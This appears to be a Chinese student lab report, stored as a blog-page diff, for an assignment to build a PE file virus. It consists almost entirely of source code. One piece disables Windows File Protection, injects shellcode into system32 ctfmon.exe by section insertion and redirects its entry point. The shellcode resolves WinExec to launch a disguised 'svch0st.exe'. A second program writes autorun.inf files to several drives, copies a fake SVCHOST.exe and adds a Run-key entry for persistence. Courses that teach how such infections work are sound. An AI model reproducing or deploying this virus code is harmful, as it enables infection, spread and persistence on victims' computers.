@@ -1,0 +1,488 @@
+I"1+<h1 id="pe文件病毒">PE文件病毒</h1>
+
+<h2 id="一实验要求">一、实验要求</h2>
+
+<p>完成一个简单的PE文件病毒核心机制的实现，具体要求如下：<br />
+1、  自定义可执行文件的搜索范围；<br />
+2、  要求能够自动识别PE文件类型；<br />
+3、  利用节插入、节扩展或节添加（三者任选一种）方式完成病毒在PE文件中的感染机制；<br />
+4、  根据你所学的注册表知识，利用注册表的系统调用API函数（创建键RegCreateKeyEx、打开一个键RegOpenKeyEx、读取键RegQueryValueEx、设置键值RegSetValueEx、删除键值RegDeketeKey）实现一种系统配置的修改，作为一种对系统使用过程中的病毒破坏机制；</p>
+
+<h2 id="二实验步骤">二、实验步骤</h2>
+
+<p><strong>核心代码</strong></p>
+
+<p>#include "main.h"<br />
+#include &lt;afxdlgs.h&gt;<br />
+CMyApp theApp;<br />
+BOOL CMyApp::InitInstance()<br />
+{<br />
+    CFileDialog dlg(TRUE);<br />
+    if (dlg.DoModal() != IDOK)<br />
+    {<br />
+        return FALSE;<br />
+    }<br />
+    //打开文件<br />
+    HANDLE hFile = ::CreateFile(dlg.GetPathName(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);<br />
+    if (INVALID_HANDLE_VALUE == hFile)<br />
+    {<br />
+        return FALSE;<br />
+    }<br />
+    IMAGE_DOS_HEADER dosHeader;<br />
+    IMAGE_NT_HEADERS32 ntHeader;<br />
+    DWORD dwReturn;<br />
+    BOOL bIsPe=FALSE;<br />
+    ::ReadFile(hFile, &amp;dosHeader, sizeof(IMAGE_DOS_HEADER), &amp;dwReturn, NULL);<br />
+    if (dwReturn == sizeof(IMAGE_DOS_HEADER))<br />
+    {<br />
+        if (dosHeader.e_magic == IMAGE_DOS_SIGNATURE) //mz<br />
+        {<br />
+            if (-1 != ::SetFilePointer(hFile, dosHeader.e_lfanew, NULL, FILE_BEGIN))<br />
+            {<br />
+                ::ReadFile(hFile, &amp;ntHeader, sizeof(IMAGE_NT_HEADERS32), &amp;dwReturn, NULL);<br />
+                if (dwReturn == sizeof(IMAGE_NT_HEADERS32))<br />
+                {<br />
+                    if (ntHeader.Signature == IMAGE_NT_SIGNATURE) //pe<br />
+                    {<br />
+                        bIsPe = TRUE;<br />
+                    }<br />
+                }<br />
+            }<br />
+        }<br />
+    }<br />
+    ::CloseHandle(hFile); //与上面的CreateFile区对写<br />
+    if (bIsPe)<br />
+    {<br />
+        MessageBoxA(NULL, "is a pe file", "", MB_OK);<br />
+    }<br />
+    else<br />
+    {<br />
+        MessageBoxA(NULL, "not a pe file", "", MB_OK);<br />
+    }<br />
+    return FALSE;<br />
+}</p>
+
+<p>2.实现节插入操作：</p>
+
+<p>#include &lt;stdio.h&gt;</p>
+
+<p>#include&lt;windows.h&gt;</p>
+
+<p>#include&lt;TCHAR.h&gt;</p>
+
+<p>#include &lt;shlwapi.h&gt;</p>
+
+<p>typedef DWORD WINAPI SfcFileException(DWORD dwUnknown0, PWCHAR pwszFile, DWORD dwUnknown1);</p>
+
+<p>void KillSFC()</p>
+
+<p>{//nvir();</p>
+
+<p>WCHAR drvpath[MAX_PATH]={0};</p>
+
+<p>GetSystemDirectoryW(drvpath,sizeof(drvpath));</p>
+
+<p>wcscat(drvpath,C"\\test.exe");</p>
+
+<p>HMODULE hModule = LoadLibraryA("SFC.DLL");</p>
+
+<p>SfcFileException *SfcFileExc = (SfcFileException (__stdcall *))GetProcAddress(hModule,(LPCSTR)5);</p>
+
+<p>SfcFileExc(0,drvpath,-1);</p>
+
+<p>FreeLibrary(hModule);</p>
+
+<p>return;</p>
+
+<p>}</p>
+
+<p>int InjectPE()</p>
+
+<p>{</p>
+
+<p>IMAGE_NT_HEADERS ntHeader;</p>
+
+<p>IMAGE_SECTION_HEADER SecInject;</p>
+
+<p>FILE* pFile;</p>
+
+<p>char systemPath[MAX_PATH];</p>
+
+<p>GetSystemDirectoryA(systemPath,sizeof(systemPath));</p>
+
+<p>char szFileName[MAX_PATH] = "\\ctfmon.exe";</p>
+
+<p>strcat(systemPath,szFileName);</p>
+
+<p>strcpy(szFileName,systemPath);</p>
+
+<p>KillSFC();</p>
+
+<p>if((pFile=fopen(szFileName,"rb+"))==NULL)//打开文件失败则退出</p>
+
+<p>{</p>
+
+<p>printf("打开文件失败\n");</p>
+
+<p>return 0;</p>
+
+<p>}</p>
+
+<p>fseek(pFile,0x3c,0);</p>
+
+<p>DWORD pNT;</p>
+
+<p>fread(&amp;pNT,sizeof(DWORD),1,pFile);</p>
+
+<p>fseek(pFile,pNT,SEEK_SET);</p>
+
+<p>fread(&amp;ntHeader,sizeof(IMAGE_NT_HEADERS),1,pFile); //读取NT头</p>
+
+<p>//保存旧入口地址</p>
+
+<p>int sectionNum = ntHeader.FileHeader.NumberOfSections;</p>
+
+<p>int OldEntryPoint = ntHeader.OptionalHeader.AddressOfEntryPoint;</p>
+
+<p>goto shellend;</p>
+
+<p>__asm</p>
+
+<p>{</p>
+
+<p>shell: PUSHAD</p>
+
+<p>MOV EAX,DWORD PTR FS:[30H] ;FS:[30H]指向PEB</p>
+
+<p>MOV EAX,DWORD PTR [EAX+0CH] ;获取PEB_LDR_DATA结构的指针</p>
+
+<p>MOV EAX,DWORD PTR [EAX+1CH] ;获取LDR_MODULE链表表首结点的inInitializeOrderModuleList成员的指针</p>
+
+<p>MOV EAX,DWORD PTR [EAX] ;LDR_MODULE链表第二个结点的inInitializeOrderModuleList成员的指针</p>
+
+<p>MOV EAX,DWORD PTR [EAX+08H] ;inInitializeOrderModuleList偏移8h便得到Kernel32.dll的模块基址</p>
+
+<p>MOV EBP,EAX ; 将Kernel32.dll模块基址地址放至kernel中</p>
+
+<p>MOV EAX,DWORD PTR [EAX+3CH] ;指向IMAGE_NT_HEADERS</p>
+
+<p>MOV EAX,DWORD PTR [EBP+EAX+120] ;指向导出表</p>
+
+<p>MOV ECX,[EBP+EAX+24] ;取导出表中导出函数名字的数目</p>
+
+<p>MOV EBX,[EBP+EAX+32] ;取导出表中名字表的地址</p>
+
+<p>ADD EBX,EBP</p>
+
+<p>PUSH WORD PTR 0X00 ;构造GetProcAddress字符串</p>
+
+<p>PUSH DWORD PTR 0X73736572</p>
+
+<p>PUSH DWORD PTR 0X64644163</p>
+
+<p>PUSH DWORD PTR 0X6F725074</p>
+
+<p>PUSH WORD PTR 0X6547</p>
+
+<p>MOV EDX,ESP</p>
+
+<p>PUSH ECX</p>
+
+<p>F1:</p>
+
+<p>MOV EDI,EDX</p>
+
+<p>POP ECX</p>
+
+<p>DEC ECX</p>
+
+<p>TEST ECX,ECX</p>
+
+<p>JZ EXIT</p>
+
+<p>MOV ESI,[EBX+ECX*4]</p>
+
+<p>ADD ESI,EBP</p>
+
+<p>PUSH ECX</p>
+
+<p>MOV ECX,15</p>
+
+<p>REPZ CMPSB</p>
+
+<p>TEST ECX,ECX</p>
+
+<p>JNZ F1</p>
+
+<p>POP ECX</p>
+
+<p>MOV ESI,[EBP+EAX+36] ;取得导出表中序号表的地址</p>
+
+<p>ADD ESI,EBP</p>
+
+<p>MOVZX ESI,WORD PTR[ESI+ECX*2] ;取得进入函数地址表的序号</p>
+
+<p>MOV EDI,[EBP+EAX+28] ;取得函数地址表的地址</p>
+
+<p>ADD EDI,EBP</p>
+
+<p>MOV EDI,[EDI+ESI*4] ;取得GetProcAddress函数的地址</p>
+
+<p>ADD EDI,EBP</p>
+
+<p>PUSH WORD PTR 0X00</p>
+
+<p>PUSH DWORD PTR 0X636578 ;构造WinExec字符串</p>
+
+<p>PUSH DWORD PTR 0X456E6957</p>
+
+<p>PUSH ESP</p>
+
+<p>PUSH EBP ;</p>
+
+<p>CALL EDI ;调用GetProcAddress取得WinExec函数的地址</p>
+
+<p>XOR EBX,EBX</p>
+
+<p>PUSH EBX</p>
+
+<p>PUSH WORD PTR 0X00 ;构造svch0st.exe符串.</p>
+
+<p>PUSH DWORD PTR 0X455845</p>
+
+<p>PUSH DWORD PTR 0X2E545330</p>
+
+<p>PUSH DWORD PTR 0X48435653</p>
+
+<p>PUSH ESP</p>
+
+<p>CALL EAX</p>
+
+<p>EXIT: ADD ESP,40 ;平衡堆栈</p>
+
+<p>POPAD</p>
+
+<p>}</p>
+
+<p>shellend:</p>
+
+<p>char *pShell;</p>
+
+<p>int nShellLen;</p>
+
+<p>__asm</p>
+
+<p>{</p>
+
+<p>LEA EAX,shell</p>
+
+<p>MOV pShell,EAX;</p>
+
+<p>LEA EBX,shellend</p>
+
+<p>SUB EBX,EAX</p>
+
+<p>MOV nShellLen,EBX</p>
+
+<p>}</p>
+
+<p>int i;</p>
+
+<p>for(i=0;i&lt;sectionNum;i++)</p>
+
+<p>{</p>
+
+<p>fseek(pFile,pNT+248+i*40,SEEK_SET); //定位到节表开始处</p>
+
+<p>fread(&amp;SecInject,sizeof(IMAGE_SECTION_HEADER),1,pFile);</p>
+
+<p>DWORD pInfect = SecInject.PointerToRawData + SecInject.Misc.VirtualSize+5;</p>
+
+<p>WORD Sign;</p>
+
+<p>fseek(pFile,pInfect,SEEK_SET);</p>
+
+<p>fread(&amp;Sign,sizeof(WORD),1,pFile);</p>
+
+<p>if(Sign == 0x1122) //已经感染过,结束程序.</p>
+
+<p>{</p>
+
+<p>//MessageBoxA(NULL,"已感染过","msg",MB_OK);</p>
+
+<p>return 0;</p>
+
+<p>}</p>
+
+<p>if((int)(SecInject.SizeOfRawData-SecInject.Misc.VirtualSize)&gt;nShellLen)</p>
+
+<p>break;</p>
+
+<p>}</p>
+
+<p>if(i&gt;=sectionNum)</p>
+
+<p>{</p>
+
+<p>printf("找不到适合插入的节");</p>
+
+<p>return 0;</p>
+
+<p>}</p>
+
+<p>DWORD lpCodeRVA = SecInject.VirtualAddress + SecInject.Misc.VirtualSize;</p>
+
+<p>DWORD lpCodeOffs = SecInject.PointerToRawData + SecInject.Misc.VirtualSize; //添加代码的文件偏移</p>
+
+<p>/*修改入口点地址并写回NT HEADER中*/</p>
+
+<p>ntHeader.OptionalHeader.AddressOfEntryPoint = lpCodeRVA;</p>
+
+<p>fseek(pFile,pNT,SEEK_SET);</p>
+
+<p>fwrite(&amp;ntHeader,sizeof(IMAGE_NT_HEADERS),1,pFile);</p>
+
+<p>SecInject.Characteristics = SecInject.Characteristics|IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE; //节属性改成可读、可执行</p>
+
+<p>SecInject.Misc.VirtualSize += nShellLen;</p>
+
+<p>fseek(pFile,pNT+248+i*40,SEEK_SET); //文件指针移动到SecInject的首址</p>
+
+<p>fwrite(&amp;SecInject,sizeof(IMAGE_SECTION_HEADER),1,pFile); //将修改后的节信息写回文件中</p>
+
+<p>/*写入SHELLCODE*/</p>
+
+<p>fseek(pFile,lpCodeOffs,SEEK_SET); //定位到添加代码的文件偏移</p>
+
+<p>for(i=0;i&lt;nShellLen;i++)</p>
+
+<p>fputc(pShell[i],pFile);</p>
+
+<p>//SHELLCODE之后是跳转到原OEP的指令</p>
+
+<p>BYTE jmp = 0xE9;</p>
+
+<p>OldEntryPoint = OldEntryPoint-(lpCodeRVA+nShellLen)-5;</p>
+
+<p>fwrite(&amp;jmp, sizeof(jmp), 1, pFile);</p>
+
+<p>fwrite(&amp;OldEntryPoint, sizeof(OldEntryPoint), 1, pFile);</p>
+
+<p>WORD InfectSign=0x1122; // 感染标志</p>
+
+<p>fwrite(&amp;InfectSign,sizeof(WORD),1,pFile);</p>
+
+<p>fclose(pFile);</p>
+
+<p>//MessageBoxA(NULL,"注入成功","INFO",MB_OK);</p>
+
+<p>return 0;</p>
+
+<p>}</p>
+
+<p>3.修改注册表</p>
+
+<p>#define SVCHOST_NUM 6</p>
+
+<p>#include&lt;stdio.h&gt;</p>
+
+<p>#include&lt;string.h&gt;</p>
+
+<p>char *autorun={"[autorun]\nopen=SVCHOST.exe\n\nshell\\1=open\nshell\\1 \\Command=SVCHOST.exe\nshell\\2\\=Open\nshell\\2\\Command=SVCHOST.exe\nshellexecute=SVCHOST.exe"};</p>
+
+<p>char *files_autorun[10]={"c:\\autorun.inf","d:\\autorun.inf","e:\\autorun.inf"};</p>
+
+<p>char *files_svchost[SVCHOST_NUM+1]={"c:\\windows\\system\\MSMOUSE.DLL",</p>
+
+<p>"c:\\windows\\system\\SVCHOST.exe","c:\\windows\\SVCHOST.exe",</p>
+
+<p>"c:\\SVCHOST.exe","d:\\SVCHOST.exe","e:\\SVCHOST.exe","SVCHOST.exe"};</p>
+
+<p>char *regadd="reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SVCHOST /d C:\\Windows\\system\\SVCHOST.exe /f";</p>
+
+<p>int copy(char *infile,char *outfile)</p>
+
+<p>{</p>
+
+<p>FILE *input,*output;</p>
+
+<p>char temp;</p>
+
+<p>if(strcmp(infile,outfile)!=0 &amp;&amp; ((input=fopen(infile,"rb"))!=NULL) &amp;&amp; ((output=fopen</p>
+
+<p>(outfile,"wb"))!=NULL))</p>
+
+<p>{</p>
+
+<p>while(!feof(input))</p>
+
+<p>{</p>
+
+<p>fread(&amp;temp,1,1,input);</p>
+
+<p>fwrite(&amp;temp,1,1,output);</p>
+
+<p>}</p>
+
+<p>fclose(input);</p>
+
+<p>fclose(output);</p>
+
+<p>return 0;</p>
+
+<p>}</p>
+
+<p>else return 1;</p>
+
+<p>}</p>
+
+<p>int main(void)</p>
+
+<p>{</p>
+
+<p>FILE *input,*output;</p>
+
+<p>int i,k;</p>
+
+<p>for(i=0;i&lt;3;i++)</p>
+
+<p>{</p>
+
+<p>output=fopen(files_autorun[i],"w");</p>
+
+<p>fprintf(output,"%s",autorun);</p>
+
+<p>fclose(output);</p>
+
+<p>}</p>
+
+<p>for(i=0;i&lt;=SVCHOST_NUM;i++)</p>
+
+<p>{</p>
+
+<p>if((input=fopen(files_svchost[i],"rb"))!=NULL)</p>
+
+<p>{</p>
+
+<p>fclose(input);</p>
+
+<p>for(k=0;k&lt;SVCHOST_NUM;k++)</p>
+
+<p>{</p>
+
+<p>copy(files_svchost[i],files_svchost[k]);</p>
+
+<p>}</p>
+
+<p>i=SVCHOST_NUM+1;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>system(regadd); /* 注册SVCHOST.exe,让其在启动时运行 */</p>
+
+<p>return 0;</p>
+
+<p>}</p>
+:ET
